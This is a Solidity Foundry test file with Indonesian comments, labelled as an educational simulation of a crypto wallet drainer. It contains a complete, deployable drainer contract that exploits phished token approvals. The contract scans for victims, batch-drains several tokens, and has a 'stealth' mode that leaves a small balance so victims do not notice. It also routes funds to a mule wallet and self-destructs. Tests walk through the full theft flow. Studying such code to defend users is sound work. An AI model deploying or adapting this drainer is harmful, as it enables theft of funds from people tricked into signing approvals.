// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ============================================================
// SIMULASI DRAIN — Full Attack Flow (EDUKASI ONLY)
// ============================================================
// Wallet drainer: 0x5B15fc342c6428B12bd8aFf9932DB64e9933f5ae
// Flow: phishing → approve → drain → selfdestruct
// Semua di Foundry test, TIDAK di-deploy on-chain
// ============================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address,address,uint256) external returns (bool);
    function allowance(address,address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function approve(address,uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// ============================================================
// MOCK TOKENS — Simulasi USDC, WETH, AERO
// ============================================================
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint8 _dec) {
        name = _name; symbol = _symbol; decimals = _dec;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
        emit Transfer(address(0), to, amt);
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        emit Approval(msg.sender, spender, amt);
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "ERC20: insufficient");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "ERC20: insufficient");
        require(allowance[from][msg.sender] >= amt, "ERC20: allowance");
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        emit Transfer(from, to, amt);
        return true;
    }
}

// ============================================================
// DRAINER CONTRACT — Simulasi drainer nyata
// ============================================================
// Pola: approve abuse → bulk transferFrom → profit ke attacker
// Mirip 0x0F7A...0E tapi disederhanakan buat belajar
// ============================================================
contract SimDrainer {
    address public owner;
    uint256 public totalDrained;
    uint256 public drainCount;
    bool public paused;

    event Drained(address indexed victim, address indexed token, uint256 amount);
    event BatchDrained(uint256 totalAmount, uint256 victimCount);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // ── Step 1: Scan ──────────────────────────────────────
    // Cek siapa aja yang udah approve drainer
    function scan(address token, address[] calldata suspects)
        external view returns (address[] memory victims, uint256[] memory amounts, uint256 total)
    {
        uint256 count;
        for (uint256 i = 0; i < suspects.length; i++) {
            if (IERC20(token).allowance(suspects[i], address(this)) > 0) count++;
        }

        victims = new address[](count);
        amounts = new uint256[](count);
        uint256 idx;

        for (uint256 i = 0; i < suspects.length; i++) {
            uint256 allow = IERC20(token).allowance(suspects[i], address(this));
            if (allow > 0) {
                uint256 bal = IERC20(token).balanceOf(suspects[i]);
                victims[idx] = suspects[i];
                amounts[idx] = allow < bal ? allow : bal;
                total += amounts[idx];
                idx++;
            }
        }
    }

    // ── Step 2: Single Drain ──────────────────────────────
    // Drain 1 victim, 1 token
    function drainOne(address token, address victim, address to)
        external onlyOwner returns (uint256 amount)
    {
        require(!paused, "paused");
        uint256 allow = IERC20(token).allowance(victim, address(this));
        if (allow == 0) return 0;

        uint256 bal = IERC20(token).balanceOf(victim);
        amount = allow < bal ? allow : bal;

        if (amount > 0) {
            IERC20(token).transferFrom(victim, to, amount);
            totalDrained += amount;
            drainCount++;
            emit Drained(victim, token, amount);
        }
    }

    // ── Step 3: Batch Drain ───────────────────────────────
    // Drain banyak victim sekaligus, banyak token
    function drainBatch(
        address[] calldata tokens,
        address[] calldata victims,
        address to
    ) external onlyOwner returns (uint256 total) {
        require(!paused, "paused");

        for (uint256 t = 0; t < tokens.length; t++) {
            for (uint256 v = 0; v < victims.length; v++) {
                uint256 allow = IERC20(tokens[t]).allowance(victims[v], address(this));
                if (allow == 0) continue;

                uint256 bal = IERC20(tokens[t]).balanceOf(victims[v]);
                uint256 amt = allow < bal ? allow : bal;

                if (amt > 0 && IERC20(tokens[t]).transferFrom(victims[v], to, amt)) {
                    total += amt;
                    totalDrained += amt;
                    drainCount++;
                    emit Drained(victims[v], tokens[t], amt);
                }
            }
        }

        emit BatchDrained(total, victims.length);
    }

    // ── Step 4: Stealth Drain ─────────────────────────────
    // Drain tapi sisain sedikit biar victim nggak langsung sadar
    function drainStealth(address token, address victim, address to, uint256 leaveBehind)
        external onlyOwner returns (uint256 amount)
    {
        require(!paused, "paused");
        uint256 allow = IERC20(token).allowance(victim, address(this));
        if (allow == 0) return 0;

        uint256 bal = IERC20(token).balanceOf(victim);
        if (bal <= leaveBehind) return 0;

        uint256 maxDrain = bal - leaveBehind;
        amount = allow < maxDrain ? allow : maxDrain;

        if (amount > 0) {
            IERC20(token).transferFrom(victim, to, amount);
            totalDrained += amount;
            drainCount++;
            emit Drained(victim, token, amount);
        }
    }

    // ── Admin ─────────────────────────────────────────────
    function setPaused(bool _p) external onlyOwner { paused = _p; }

    function transferOwnership(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    function withdrawStuck(address token) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(owner, bal);
    }

    function kill() external onlyOwner {
        selfdestruct(payable(owner));
    }
}

// ============================================================
// TEST — Simulasi Full Attack Flow
// ============================================================
contract SimDrainerTest is Test {
    SimDrainer drainer;
    MockERC20 usdc;
    MockERC20 weth;
    MockERC20 aero;

    // Attacker = wallet baru yang dibuat
    address attacker = 0x5B15fc342c6428B12bd8aFf9932DB64e9933f5ae;

    // Victims — simulasi 5 wallet yang kena phishing
    address victim1 = address(uint160(0x1001));
    address victim2 = address(uint160(0x1002));
    address victim3 = address(uint160(0x1003));
    address victim4 = address(uint160(0x1004));
    address victim5 = address(uint160(0x1005));

    function setUp() public {
        // Deploy drainer dari wallet attacker
        vm.startPrank(attacker);
        drainer = new SimDrainer();
        vm.stopPrank();

        // Deploy mock tokens
        usdc = new MockERC20("USD Coin", "USDC", 6);
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        aero = new MockERC20("Aerodrome", "AERO", 18);

        // ── Simulasi: victims punya saldo ──
        // Victim 1: whale — $50k USDC, 10 WETH, 5000 AERO
        usdc.mint(victim1, 50_000e6);
        weth.mint(victim1, 10 ether);
        aero.mint(victim1, 5000 ether);

        // Victim 2: medium — $5k USDC, 2 WETH
        usdc.mint(victim2, 5_000e6);
        weth.mint(victim2, 2 ether);

        // Victim 3: small — $500 USDC, 0.5 WETH, 100 AERO
        usdc.mint(victim3, 500e6);
        weth.mint(victim3, 0.5 ether);
        aero.mint(victim3, 100 ether);

        // Victim 4: NFT trader — $12k USDC, 3 WETH
        usdc.mint(victim4, 12_000e6);
        weth.mint(victim4, 3 ether);

        // Victim 5: degen — $200 USDC, 0.1 WETH, 50 AERO
        usdc.mint(victim5, 200e6);
        weth.mint(victim5, 0.1 ether);
        aero.mint(victim5, 50 ether);

        // ── Simulasi: victims kena phishing, approve unlimited ──
        // Ini yang terjadi waktu mereka klik link palsu & sign tx
        _phishingApprove(victim1);
        _phishingApprove(victim2);
        _phishingApprove(victim3);
        _phishingApprove(victim4);
        _phishingApprove(victim5);
    }

    function _phishingApprove(address victim) internal {
        vm.startPrank(victim);
        usdc.approve(address(drainer), type(uint256).max);
        weth.approve(address(drainer), type(uint256).max);
        aero.approve(address(drainer), type(uint256).max);
        vm.stopPrank();
    }

    // ── Test 1: Scan — deteksi siapa yang bisa di-drain ──
    function test_Scan() public view {
        address[] memory suspects = new address[](5);
        suspects[0] = victim1; suspects[1] = victim2; suspects[2] = victim3;
        suspects[3] = victim4; suspects[4] = victim5;

        (address[] memory victims, uint256[] memory amounts, uint256 total) =
            drainer.scan(address(usdc), suspects);

        assertEq(victims.length, 5, "all 5 victims approved");
        assertEq(amounts[0], 50_000e6, "victim1 USDC");
        assertEq(amounts[1], 5_000e6, "victim2 USDC");
        assertEq(amounts[2], 500e6, "victim3 USDC");
        assertEq(amounts[3], 12_000e6, "victim4 USDC");
        assertEq(amounts[4], 200e6, "victim5 USDC");
        assertEq(total, 67_700e6, "total USDC drainable");
    }

    // ── Test 2: Single Drain — drain 1 victim ──
    function test_DrainOne() public {
        vm.prank(attacker);
        uint256 amount = drainer.drainOne(address(usdc), victim1, attacker);

        assertEq(amount, 50_000e6, "drained $50k");
        assertEq(usdc.balanceOf(attacker), 50_000e6);
        assertEq(usdc.balanceOf(victim1), 0);
        assertEq(drainer.totalDrained(), 50_000e6);
        assertEq(drainer.drainCount(), 1);
    }

    // ── Test 3: Batch Drain — drain semua victim, semua token ──
    function test_DrainBatch() public {
        address[] memory tokens = new address[](3);
        tokens[0] = address(usdc);
        tokens[1] = address(weth);
        tokens[2] = address(aero);

        address[] memory victims = new address[](5);
        victims[0] = victim1; victims[1] = victim2; victims[2] = victim3;
        victims[3] = victim4; victims[4] = victim5;

        vm.prank(attacker);
        uint256 total = drainer.drainBatch(tokens, victims, attacker);

        // USDC: 50000 + 5000 + 500 + 12000 + 200 = 67,700
        assertEq(usdc.balanceOf(attacker), 67_700e6, "all USDC drained");

        // WETH: 10 + 2 + 0.5 + 3 + 0.1 = 15.6
        assertEq(weth.balanceOf(attacker), 15.6 ether, "all WETH drained");

        // AERO: 5000 + 100 + 50 = 5150 (victim2 & victim4 no AERO)
        assertEq(aero.balanceOf(attacker), 5150 ether, "all AERO drained");

        // Semua victim kosong
        assertEq(usdc.balanceOf(victim1), 0);
        assertEq(usdc.balanceOf(victim2), 0);
        assertEq(usdc.balanceOf(victim3), 0);
        assertEq(usdc.balanceOf(victim4), 0);
        assertEq(usdc.balanceOf(victim5), 0);
        assertEq(weth.balanceOf(victim1), 0);
        assertEq(weth.balanceOf(victim5), 0);

        assertTrue(total > 0);
        assertEq(drainer.drainCount(), 13); // 5 USDC + 5 WETH + 3 AERO (victim2,4 no AERO)
    }

    // ── Test 4: Stealth Drain — sisain dikit biar nggak sadar ──
    function test_DrainStealth() public {
        vm.prank(attacker);
        uint256 amount = drainer.drainStealth(
            address(usdc), victim1, attacker, 100e6  // sisain $100
        );

        assertEq(amount, 49_900e6, "drained $49,900");
        assertEq(usdc.balanceOf(victim1), 100e6, "victim still sees $100");
        assertEq(usdc.balanceOf(attacker), 49_900e6);
    }

    // ── Test 5: Partial Allowance — victim approve terbatas ──
    function test_PartialAllowance() public {
        // Victim 3 cuma approve 100 USDC (bukan unlimited)
        vm.prank(victim3);
        usdc.approve(address(drainer), 100e6);

        vm.prank(attacker);
        uint256 amount = drainer.drainOne(address(usdc), victim3, attacker);

        assertEq(amount, 100e6, "capped at allowance");
        assertEq(usdc.balanceOf(victim3), 400e6, "400 USDC left");
    }

    // ── Test 6: No Allowance — victim nggak approve ──
    function test_NoAllowance() public {
        address safeUser = address(uint160(0x2001));
        usdc.mint(safeUser, 10_000e6);
        // No approve!

        vm.prank(attacker);
        uint256 amount = drainer.drainOne(address(usdc), safeUser, attacker);

        assertEq(amount, 0, "nothing drained");
        assertEq(usdc.balanceOf(safeUser), 10_000e6, "funds safe");
    }

    // ── Test 7: Pause ──
    function test_Pause() public {
        vm.startPrank(attacker);
        drainer.setPaused(true);

        vm.expectRevert("paused");
        drainer.drainOne(address(usdc), victim1, attacker);

        drainer.setPaused(false);
        uint256 amount = drainer.drainOne(address(usdc), victim1, attacker);
        assertEq(amount, 50_000e6, "works after unpause");
        vm.stopPrank();
    }

    // ── Test 8: Non-owner nggak bisa drain ──
    function test_NonOwnerRevert() public {
        vm.prank(victim1);
        vm.expectRevert("not owner");
        drainer.drainOne(address(usdc), victim2, victim1);
    }

    // ── Test 9: Transfer Ownership ──
    function test_TransferOwnership() public {
        address newAttacker = address(uint160(0x3001));
        vm.prank(attacker);
        drainer.transferOwnership(newAttacker);

        assertEq(drainer.owner(), newAttacker);

        // Old owner locked out
        vm.prank(attacker);
        vm.expectRevert("not owner");
        drainer.drainOne(address(usdc), victim1, attacker);

        // New owner works
        vm.prank(newAttacker);
        drainer.drainOne(address(usdc), victim1, newAttacker);
        assertEq(usdc.balanceOf(newAttacker), 50_000e6);
    }

    // ── Test 10: Full Attack Simulation ──
    // Simulasi complete flow: scan → batch drain → verify → kill
    function test_FullAttackFlow() public {
        // Step 1: Scan targets
        address[] memory suspects = new address[](5);
        suspects[0] = victim1; suspects[1] = victim2; suspects[2] = victim3;
        suspects[3] = victim4; suspects[4] = victim5;

        (, , uint256 usdcTotal) = drainer.scan(address(usdc), suspects);
        (, , uint256 wethTotal) = drainer.scan(address(weth), suspects);
        (, , uint256 aeroTotal) = drainer.scan(address(aero), suspects);

        // Step 2: Execute batch drain
        address[] memory tokens = new address[](3);
        tokens[0] = address(usdc); tokens[1] = address(weth); tokens[2] = address(aero);

        vm.prank(attacker);
        drainer.drainBatch(tokens, suspects, attacker);

        // Step 3: Verify attacker got everything
        assertEq(usdc.balanceOf(attacker), usdcTotal, "USDC matches scan");
        assertEq(weth.balanceOf(attacker), wethTotal, "WETH matches scan");
        assertEq(aero.balanceOf(attacker), aeroTotal, "AERO matches scan");

        // Step 4: Verify all victims empty
        for (uint256 i = 0; i < 5; i++) {
            assertEq(usdc.balanceOf(suspects[i]), 0, "victim USDC empty");
            assertEq(weth.balanceOf(suspects[i]), 0, "victim WETH empty");
        }

        // Step 5: Stats
        assertEq(drainer.drainCount(), 13);
        assertTrue(drainer.totalDrained() > 0);

        // Step 6: Selfdestruct (post-Cancun: sends ETH, code stays)
        vm.deal(address(drainer), 1 ether);
        uint256 balBefore = attacker.balance;
        vm.prank(attacker);
        drainer.kill();
        assertEq(attacker.balance, balBefore + 1 ether, "ETH recovered");
    }

    // ── Test 11: Drain ke address lain (money laundering sim) ──
    function test_DrainToDifferentAddress() public {
        address mule = address(uint160(0x4001)); // "mule" wallet

        vm.prank(attacker);
        drainer.drainOne(address(usdc), victim1, mule);

        assertEq(usdc.balanceOf(mule), 50_000e6, "funds to mule");
        assertEq(usdc.balanceOf(attacker), 0, "attacker clean");
    }
}
